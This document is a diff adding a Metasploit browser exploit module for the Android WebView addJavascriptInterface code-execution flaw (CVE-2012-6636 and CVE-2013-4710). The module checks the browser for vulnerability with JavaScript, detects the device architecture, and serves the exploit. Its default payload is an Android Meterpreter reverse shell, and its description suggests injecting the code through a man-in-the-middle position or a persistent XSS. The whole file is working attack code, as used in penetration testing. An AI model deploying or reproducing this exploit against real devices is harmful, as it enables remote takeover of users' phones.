@@ -1,0 +1,161 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/exploit/android'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+  include Msf::Exploit::Remote::BrowserAutopwn
+  include Msf::Exploit::Android
+
+  VULN_CHECK_JS = %Q|
+    for (i in top) {
+      try {
+        top[i].getClass().forName('java.lang.Runtime');
+        is_vuln = true; break;
+      } catch(e) {}
+    }
+  |
+
+  autopwn_info(
+    :os_name    => OperatingSystems::Match::ANDROID,
+    :arch       => ARCH_ARMLE,
+    :javascript => true,
+    :rank       => ExcellentRanking,
+    :vuln_test  => VULN_CHECK_JS
+  )
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'                => 'Android Browser and WebView addJavascriptInterface Code Execution',
+      'Description'         => %q{
+            This module exploits a privilege escalation issue in Android < 4.2's WebView component
+          that arises when untrusted Javascript code is executed by a WebView that has one or more
+          Interfaces added to it. The untrusted Javascript code can call into the Java Reflection
+          APIs exposed by the Interface and execute arbitrary commands.
+
+          Some distributions of the Android Browser app have an addJavascriptInterface
+          call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs
+          4.1.2 release of Android is known to be vulnerable.
+
+          A secondary attack vector involves the WebViews embedded inside a large number
+          of Android applications. Ad integrations are perhaps the worst offender here.
+          If you can MITM the WebView's HTTP connection, or if you can get a persistent XSS
+          into the page displayed in the WebView, then you can inject the html/js served
+          by this module and get a shell.
+
+          Note: Adding a .js to the URL will return plain javascript (no HTML markup).
+      },
+      'License'             => MSF_LICENSE,
+      'Author'              => [
+        'jduck', # original msf module
+        'joev'   # static server
+      ],
+      'References'          => [
+        ['URL', 'http://blog.trustlook.com/2013/09/04/alert-android-webview-addjavascriptinterface-code-execution-vulnerability/'],
+        ['URL', 'https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/'],
+        ['URL', 'http://50.56.33.56/blog/?p=314'],
+        ['URL', 'https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/'],
+        ['URL', 'https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py'],
+        ['CVE', '2012-6636'], # original CVE for addJavascriptInterface
+        ['CVE', '2013-4710'], # native browser addJavascriptInterface (searchBoxJavaBridge_)
+        ['EDB', '31519'],
+        ['OSVDB', '97520']
+      ],
+      'Platform'            => ['android', 'linux'],
+      'Arch'                => [ARCH_DALVIK, ARCH_X86, ARCH_ARMLE, ARCH_MIPSLE],
+      'DefaultOptions'      => { 'PAYLOAD' => 'android/meterpreter/reverse_tcp' },
+      'Targets'             => [ [ 'Automatic', {} ] ],
+      'DisclosureDate'      => 'Dec 21 2012',
+      'DefaultTarget'       => 0,
+      'BrowserRequirements' => {
+        :source     => 'script',
+        :os_name    => OperatingSystems::Match::ANDROID,
+        :vuln_test  => VULN_CHECK_JS,
+        :vuln_test_error => 'No vulnerable Java objects were found in this web context.'
+      }
+    ))
+
+    deregister_options('JsObfuscate')
+  end
+
+  # Hooked to prevent BrowserExploitServer from attempting to do JS detection
+  # on requests for the static javascript file
+  def on_request_uri(cli, req)
+    if req.uri =~ /\.js/
+      serve_static_js(cli, req)
+    else
+      super
+    end
+  end
+
+  # The browser appears to be vulnerable, serve the exploit
+  def on_request_exploit(cli, req, browser)
+    arch = normalize_arch(browser[:arch])
+    print_status "Serving #{arch} exploit..."
+    send_response_html(cli, html(arch))
+  end
+
+  # Called when a client requests a .js route.
+  # This is handy for post-XSS.
+  def serve_static_js(cli, req)
+    arch          = req.qstring['arch']
+    response_opts = { 'Content-type' => 'text/javascript' }
+
+    if arch.present?
+      print_status("Serving javascript for arch #{normalize_arch arch}")
+      send_response(cli, add_javascript_interface_exploit_js(normalize_arch arch), response_opts)
+    else
+      print_status("Serving arch detection javascript")
+      send_response(cli, static_arch_detect_js, response_opts)
+    end
+  end
+
+  # This is served to requests for the static .js file.
+  # Because we have to use javascript to detect arch, we have 3 different
+  # versions of the static .js file (x86/mips/arm) to choose from. This
+  # small snippet of js detects the arch and requests the correct file.
+  def static_arch_detect_js
+    %Q|
+      var arches = {};
+      arches['#{ARCH_ARMLE}']  = /arm/i;
+      arches['#{ARCH_MIPSLE}'] = /mips/i;
+      arches['#{ARCH_X86}']    = /x86/i;
+
+      var arch = null;
+      for (var name in arches) {
+        if (navigator.platform.toString().match(arches[name])) {
+          arch = name;
+          break;
+        }
+      }
+
+      if (arch) {
+        // load the script with the correct arch
+        var script = document.createElement('script');
+        script.setAttribute('src', '#{get_uri}/#{Rex::Text::rand_text_alpha(5)}.js?arch='+arch);
+        script.setAttribute('type', 'text/javascript');
+
+        // ensure body is parsed and we won't be in an uninitialized state
+        setTimeout(function(){
+          var node = document.body \|\| document.head;
+          node.appendChild(script);
+        }, 100);
+      }
+    |
+  end
+
+  # @return [String] normalized client architecture
+  def normalize_arch(arch)
+    if SUPPORTED_ARCHES.include?(arch) then arch else DEFAULT_ARCH end
+  end
+
+  def html(arch)
+    "<!doctype html><html><body><script>#{add_javascript_interface_exploit_js(arch)}</script></body></html>"
+  end
+end
